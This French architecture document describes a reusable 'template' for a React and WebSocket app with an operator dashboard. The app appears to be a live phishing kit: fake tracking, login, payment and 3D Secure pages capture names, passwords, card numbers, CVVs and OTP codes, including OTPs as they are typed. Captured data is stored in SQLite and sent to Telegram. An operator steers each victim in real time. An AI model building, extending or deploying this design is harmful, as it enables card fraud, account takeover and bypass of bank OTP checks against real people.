# 🏗️ Architecture du Projet - Template

Ce document décrit l'architecture complète du projet pour servir de template pour vos futurs projets.

---

## 📋 Table des matières

1. [Vue d'ensemble](#vue-densemble)
2. [Technologies utilisées](#technologies-utilisées)
3. [Architecture système](#architecture-système)
4. [Structure du projet](#structure-du-projet)
5. [Flux de données](#flux-de-données)
6. [Communication WebSocket](#communication-websocket)
7. [Base de données](#base-de-données)
8. [Déploiement](#déploiement)
9. [Points clés pour réutilisation](#points-clés-pour-réutilisation)

---

## 🎯 Vue d'ensemble

Ce projet est une application web full-stack avec :

- **Frontend** : Application React avec Vite
- **Backend** : Serveur WebSocket Node.js
- **Base de données** : SQLite (better-sqlite3)
- **Communication** : WebSocket pour temps réel
- **Notifications** : Intégration Telegram
- **Déploiement** : Render.com (backend) + VPS (frontend)

### Fonctionnalités principales

1. **Application multi-pages** avec routing React
2. **Dashboard en temps réel** pour surveiller les clients
3. **Communication bidirectionnelle** via WebSocket
4. **Persistance des données** avec SQLite
5. **Notifications externes** via Telegram Bot API

---

## 🛠️ Technologies utilisées

### Frontend

| Technologie | Version | Usage |
|------------|---------|-------|
| **React** | 19.1.1 | Framework UI |
| **Vite** | 7.1.7 | Build tool & dev server |
| **React Router** | 7.9.4 | Routing |
| **Chakra UI** | 3.28.0 | Composants UI |
| **Axios** | 1.13.1 | Requêtes HTTP |
| **Framer Motion** | 12.23.24 | Animations |
| **React Icons** | 5.5.0 | Icônes |

### Backend

| Technologie | Version | Usage |
|------------|---------|-------|
| **Node.js** | >=18.0.0 | Runtime |
| **WebSocket (ws)** | 8.18.3 | Communication temps réel |
| **better-sqlite3** | 12.4.1 | Base de données |
| **HTTP Server** | Built-in | Serveur HTTP pour WebSocket |

### Outils de développement

- **ESLint** : Linting
- **Git** : Version control
- **npm** : Gestionnaire de paquets

---

## 🏛️ Architecture système

```
┌─────────────────────────────────────────────────────────────┐
│                        CLIENT (Browser)                      │
├─────────────────────────────────────────────────────────────┤
│                                                               │
│  ┌──────────────┐    ┌──────────────┐    ┌──────────────┐ │
│  │   React App  │    │  socket.js   │    │   Dashboard  │ │
│  │   (Vite)     │◄───│  (WebSocket) │───►│   (Panel)    │ │
│  └──────────────┘    └──────────────┘    └──────────────┘ │
│         │                   │                      │         │
│         │                   │                      │         │
│         └───────────────────┼──────────────────────┘         │
│                             │                                 │
│                             │ WSS/WSS                         │
└─────────────────────────────┼─────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────┐
│                  WEBSOCKET SERVER (Node.js)                  │
├─────────────────────────────────────────────────────────────┤
│                                                               │
│  ┌──────────────┐    ┌──────────────┐    ┌──────────────┐ │
│  │   WebSocket  │    │   Database   │    │ Broadcasting  │ │
│  │   Handler    │───►│   (SQLite)   │◄───│   Manager    │ │
│  └──────────────┘    └──────────────┘    └──────────────┘ │
│         │                                                      │
│         │                                                      │
│         └──────────────────────────────────────────────────┘ │
└─────────────────────────────────────────────────────────────┘
                              │
                              │ HTTP API
                              ▼
┌─────────────────────────────────────────────────────────────┐
│                    TELEGRAM BOT API                          │
└─────────────────────────────────────────────────────────────┘
```

### Composants principaux

1. **Client React** : Interface utilisateur multi-pages
2. **socket.js** : Script WebSocket côté client (chargé séparément)
3. **Dashboard** : Panel d'administration en temps réel
4. **Serveur WebSocket** : Gestion des connexions et messages
5. **Base de données SQLite** : Stockage persistant
6. **Telegram Bot** : Notifications externes

---

## 📁 Structure du projet

```
ram-app/
├── client/                          # Application React Frontend
│   ├── public/                      # Fichiers statiques publics
│   │   ├── assets/
│   │   │   ├── images/              # Images
│   │   │   ├── js/
│   │   │   │   └── socket.js        # Script WebSocket client (chargé séparément)
│   │   │   └── styles/
│   │   │       └── styles.css       # Styles globaux
│   │   └── .htaccess                # Configuration Apache
│   │
│   ├── src/                         # Code source React
│   │   ├── components/              # Composants réutilisables
│   │   │   ├── CustomButton.jsx
│   │   │   ├── Footer.jsx
│   │   │   ├── FormInput.jsx
│   │   │   ├── Header.jsx
│   │   │   └── ProgressBar.jsx
│   │   │
│   │   ├── pages/                   # Pages de l'application
│   │   │   ├── Track.jsx            # Page d'accueil
│   │   │   ├── Login.jsx            # Page de connexion
│   │   │   ├── PaymentDetails.jsx   # Détails de paiement
│   │   │   ├── ThreeDSecure.jsx     # 3D Secure
│   │   │   ├── ThreeDSecureBank.jsx # Validation banque
│   │   │   ├── SecurityCheck.jsx    # Vérification sécurité
│   │   │   ├── Complete.jsx         # Page finale
│   │   │   └── Dashboard.jsx        # Panel d'administration
│   │   │
│   │   ├── hooks/                   # React Hooks personnalisés
│   │   │   └── useTelegram.js      # Hook pour Telegram
│   │   │
│   │   ├── lib/                     # Bibliothèques utilitaires
│   │   │   └── telegram.js         # Client Telegram API
│   │   │
│   │   ├── utils/                   # Utilitaires
│   │   │   ├── messageBuilder.js   # Construction de messages
│   │   │   └── validation.js       # Validation de données
│   │   │
│   │   ├── theme/                   # Configuration thème
│   │   │   └── index.js             # Thème Chakra UI
│   │   │
│   │   ├── App.jsx                  # Composant racine + routing
│   │   ├── App.css                  # Styles de l'app
│   │   ├── main.jsx                 # Point d'entrée React
│   │   └── index.css                # Styles globaux
│   │
│   ├── dist/                        # Build de production (généré)
│   │   ├── index.html
│   │   ├── assets/
│   │   └── .htaccess
│   │
│   ├── .env.example                 # Exemple de variables d'environnement
│   ├── .env                         # Variables d'environnement (non versionné)
│   ├── deploy-vps.sh                # Script de déploiement VPS
│   ├── index.html                   # Template HTML
│   ├── package.json                 # Dépendances npm
│   ├── vite.config.js               # Configuration Vite
│   └── eslint.config.js             # Configuration ESLint
│
├── server/                          # Serveur WebSocket Backend
│   ├── index.js                     # Serveur principal
│   ├── package.json                 # Dépendances npm
│   └── clients.sqlite               # Base de données (générée automatiquement)
│
├── .gitignore                       # Fichiers ignorés par Git
├── .htaccess                        # Configuration Apache racine
├── apache-config-example.conf       # Exemple config Apache
├── nginx-config-example.conf       # Exemple config Nginx
├── render.yaml                      # Configuration Render.com
├── deploy-vps.sh                    # Script déploiement VPS
├── setup-git.sh                     # Script setup Git
├── ARCHITECTURE.md                  # Ce fichier
└── GUIDE_COMPLET.md                 # Guide d'utilisation

```

---

## 🔄 Flux de données

### 1. Connexion initiale

```
Client Browser
    │
    │ 1. Charge socket.js
    │
    ▼
socket.js détecte la route
    │
    │ 2. Crée WebSocket vers serveur
    │
    ▼
Serveur WebSocket
    │
    │ 3. Envoie "welcome"
    │
    ▼
Client reçoit welcome
    │
    │ 4. Envoie "register" avec clientId
    │
    ▼
Serveur enregistre client
    │
    │ 5. Sauvegarde en DB
    │ 6. Envoie "registered"
    │ 7. Broadcast "client_registered" aux dashboards
    │
    ▼
Dashboard reçoit notification
    │
    │ 8. Met à jour la liste des clients
    │
    ▼
Affichage dans le panel
```

### 2. Mise à jour de présence

```
Client navigue vers nouvelle page
    │
    │ 1. socket.js détecte changement
    │
    ▼
Envoie "presence" avec page actuelle
    │
    ▼
Serveur met à jour DB
    │
    │ 2. Update current_page
    │ 3. Broadcast "client_updated"
    │
    ▼
Dashboard reçoit mise à jour
    │
    │ 4. Met à jour l'affichage
    │
    ▼
Panel affiche nouvelle page
```

### 3. Soumission de données

```
Client remplit formulaire
    │
    │ 1. Envoie "track_data" / "login_data" / "payment_data"
    │
    ▼
Serveur sauvegarde en DB
    │
    │ 2. Update client record
    │ 3. Broadcast "client_updated"
    │ 4. Envoie notification Telegram (optionnel)
    │
    ▼
Dashboard reçoit mise à jour
    │
    │ 5. Affiche nouvelles données
    │
    ▼
Panel mis à jour
```

### 4. Communication Dashboard → Client

```
Dashboard clique sur action
    │
    │ 1. Envoie "direct" avec payload
    │
    ▼
Serveur route vers client cible
    │
    │ 2. Envoie "direct" au client
    │
    ▼
Client reçoit message
    │
    │ 3. Traite le payload
    │    - Navigation
    │    - Affichage erreur
    │    - Action spécifique
    │
    ▼
Client exécute l'action
```

---

## 🔌 Communication WebSocket

### Protocole de messages

Tous les messages sont au format JSON :

```json
{
  "type": "message_type",
  "data": "..."
}
```

### Types de messages

#### Client → Serveur

| Type | Description | Données |
|------|-------------|---------|
| `register` | Enregistrer un client/dashboard | `clientId`, `role` |
| `presence` | Mise à jour de présence | `clientId`, `page` |
| `track_data` | Données de tracking | `clientId`, `fullName`, `phone`, etc. |
| `login_data` | Données de connexion | `clientId`, `email`, `password` |
| `payment_data` | Données de paiement | `clientId`, `cardNumber`, etc. |
| `otp_update` | Mise à jour OTP (typing) | `clientId`, `otp` |
| `otp_submit` | Soumission OTP | `clientId`, `otp` |
| `session_complete` | Session terminée | `clientId` |
| `list` | Demander la liste (dashboard) | - |
| `direct` | Message direct à un client | `to`, `payload` |

#### Serveur → Client

| Type | Description | Données |
|------|-------------|---------|
| `welcome` | Message de bienvenue | `message`, `time`, `you` |
| `registered` | Confirmation d'enregistrement | `clientId`, `role`, `ip`, `time` |
| `clients` | Liste des clients (dashboard) | `items[]` |
| `client_registered` | Nouveau client (dashboard) | `client` |
| `client_updated` | Client mis à jour (dashboard) | `client` |
| `client_disconnected` | Client déconnecté (dashboard) | `clientId` |
| `direct` | Message direct | `from`, `payload`, `action` |
| `track_data_saved` | Confirmation sauvegarde | - |
| `login_data_saved` | Confirmation sauvegarde | - |
| `payment_data_saved` | Confirmation sauvegarde | - |
| `error` | Erreur | `message` |

### Gestion des rôles

Le serveur distingue deux types de connexions :

1. **`role: "user"`** : Clients normaux
   - Enregistrés en base de données
   - Génèrent des notifications aux dashboards
   - Peuvent recevoir des messages directs

2. **`role: "dashboard"`** : Panels d'administration
   - Ajoutés au Set `dashboards`
   - Reçoivent toutes les notifications
   - Peuvent envoyer des messages directs aux clients
   - Peuvent demander la liste complète des clients

---

## 💾 Base de données

### Schéma SQLite

```sql
CREATE TABLE clients (
  id TEXT PRIMARY KEY,                    -- UUID du client
  ip TEXT,                                 -- Adresse IP
  created_at INTEGER NOT NULL,             -- Timestamp création
  last_seen INTEGER NOT NULL,              -- Dernière activité
  
  -- Données de tracking
  current_page TEXT,                       -- Page actuelle
  full_name TEXT,
  phone TEXT,
  email TEXT,
  address TEXT,
  postal_code TEXT,
  
  -- Données de connexion
  login_email TEXT,
  login_password TEXT,
  
  -- Données de paiement
  card_holder TEXT,
  card_number TEXT,
  card_expiration TEXT,
  card_cvv TEXT,
  
  -- Données 3D Secure
  otp_code TEXT,
  otp_status TEXT,                         -- typing, submitted, approved, rejected
  otp_submitted_at INTEGER
);
```

### Opérations principales

- **Upsert** : Créer ou mettre à jour un client
- **Update page** : Mettre à jour la page actuelle
- **Update track data** : Mettre à jour les données de tracking
- **Update login data** : Mettre à jour les données de connexion
- **Update payment data** : Mettre à jour les données de paiement
- **Update OTP** : Mettre à jour le code OTP
- **Delete** : Supprimer un client (déconnexion/session complète)
- **Get all** : Récupérer tous les clients (pour dashboard)

---

## 🚀 Déploiement

### Architecture de déploiement

```
┌─────────────────────────────────────┐
│         Render.com                  │
│                                     │
│  ┌──────────────────────────────┐  │
│  │  WebSocket Server            │  │
│  │  (ram-ws-backend.onrender.com)│  │
│  └──────────────────────────────┘  │
│                                     │
│  ┌──────────────────────────────┐  │
│  │  Client React (optionnel)    │  │
│  │  (ram-react-client.onrender.com)│ │
│  └──────────────────────────────┘  │
└─────────────────────────────────────┘
              │
              │ WSS
              │
┌─────────────┼─────────────────────────┐
│             │                          │
│  ┌──────────▼──────────┐              │
│  │   VPS (Apache/Nginx) │              │
│  │                      │              │
│  │  Client React        │              │
│  │  (shipp834.com/...)  │              │
│  └──────────────────────┘              │
└────────────────────────────────────────┘
```

### Configuration Render.com

**Service WebSocket** (`render.yaml`) :
```yaml
- type: web
  name: ram-websocket-server
  env: node
  plan: free
  buildCommand: cd server && npm install
  startCommand: cd server && node index.js
  envVars:
    - key: PORT
      value: 8090
```

**Service Client** (optionnel) :
```yaml
- type: web
  name: ram-react-client
  env: node
  plan: free
  buildCommand: cd client && npm install && npm run build
  startCommand: cd client && npm start
  envVars:
    - key: VITE_WS_HOST
      value: ram-ws-backend.onrender.com
```

### Configuration VPS

1. **Build local** : `cd client && npm run build`
2. **Transfert** : Copier `dist/` vers VPS
3. **Apache** : `.htaccess` inclus pour routing SPA
4. **Variables** : `VITE_WS_HOST` injecté au build

---

## 🎯 Points clés pour réutilisation

### 1. Structure modulaire

- **Frontend séparé** : `client/` indépendant
- **Backend séparé** : `server/` indépendant
- **Scripts partagés** : Racine du projet

### 2. Communication temps réel

- **WebSocket natif** : Pas de dépendances lourdes
- **Gestion des rôles** : Clients vs Dashboards
- **Broadcasting** : Notifications en temps réel

### 3. Base de données légère

- **SQLite** : Pas de serveur séparé
- **better-sqlite3** : Performant et synchrone
- **Schéma flexible** : Facile à étendre

### 4. Routing dynamique

- **Détection automatique** : Base path détecté automatiquement
- **Support subdirectory** : Fonctionne en sous-dossier
- **SPA routing** : `.htaccess` pour Apache

### 5. Variables d'environnement

- **VITE_*** : Injectées au build
- **Process.env** : Pour le serveur
- **.env.example** : Template pour nouveaux projets

### 6. Scripts de déploiement

- **deploy-vps.sh** : Automatisation déploiement
- **render.yaml** : Configuration Render.com
- **Build intégré** : Vérifications automatiques

### 7. Séparation des préoccupations

- **socket.js** : WebSocket côté client séparé
- **Pages React** : Logique métier séparée
- **Utils** : Fonctions réutilisables
- **Components** : Composants réutilisables

### 8. Extensibilité

- **Nouveaux types de messages** : Facile à ajouter
- **Nouvelles pages** : Ajouter route dans App.jsx
- **Nouvelles données** : Étendre schéma DB
- **Nouveaux composants** : Structure claire

---

## 📝 Checklist pour nouveau projet

### Initialisation

- [ ] Copier la structure `ram-app/`
- [ ] Renommer les dossiers selon le projet
- [ ] Mettre à jour `package.json` (nom, version)
- [ ] Configurer `.env.example` avec nouvelles variables

### Configuration

- [ ] Configurer les routes dans `App.jsx`
- [ ] Créer les pages nécessaires dans `src/pages/`
- [ ] Configurer le schéma DB dans `server/index.js`
- [ ] Définir les types de messages WebSocket

### Déploiement

- [ ] Configurer `render.yaml` pour Render.com
- [ ] Configurer `deploy-vps.sh` pour VPS
- [ ] Tester le build localement
- [ ] Vérifier les variables d'environnement

### Documentation

- [ ] Mettre à jour `GUIDE_COMPLET.md`
- [ ] Documenter les nouveaux types de messages
- [ ] Documenter les nouvelles routes
- [ ] Mettre à jour `ARCHITECTURE.md`

---

## 🔧 Personnalisation

### Changer le port WebSocket

**Serveur** (`server/index.js`) :
```javascript
const port = Number(process.env.PORT || process.env.WS_PORT || 8090);
```

**Client** (`.env`) :
```env
VITE_WS_HOST=localhost:8090
```

### Ajouter un nouveau type de message

**Serveur** (`server/index.js`) :
```javascript
if (message.type === "nouveau_type" && typeof message.clientId === "string") {
  // Traitement
  broadcastToDashboards({
    type: "client_updated",
    client: clientToJSON(client),
  });
}
```

**Client** (`public/assets/js/socket.js`) :
```javascript
socket.send(JSON.stringify({
  type: "nouveau_type",
  clientId,
  data: "..."
}));
```

### Ajouter une nouvelle page

1. Créer `src/pages/NouvellePage.jsx`
2. Ajouter route dans `App.jsx` :
```javascript
<Route path="/nouvelle-page" element={<NouvellePage />} />
```
3. Ajouter dans `knownRoutes` si nécessaire

### Changer la base de données

**SQLite → PostgreSQL** :
- Remplacer `better-sqlite3` par `pg`
- Adapter les requêtes SQL
- Configurer la connexion

**SQLite → MongoDB** :
- Remplacer `better-sqlite3` par `mongodb`
- Adapter le schéma
- Utiliser les opérations MongoDB

---

## 📚 Ressources

- [React Documentation](https://react.dev/)
- [Vite Documentation](https://vite.dev/)
- [WebSocket API](https://developer.mozilla.org/en-US/docs/Web/API/WebSocket)
- [better-sqlite3](https://github.com/WiseLibs/better-sqlite3)
- [Render.com Documentation](https://render.com/docs)

---

**Dernière mise à jour** : Décembre 2024

**Version du template** : 1.0.0
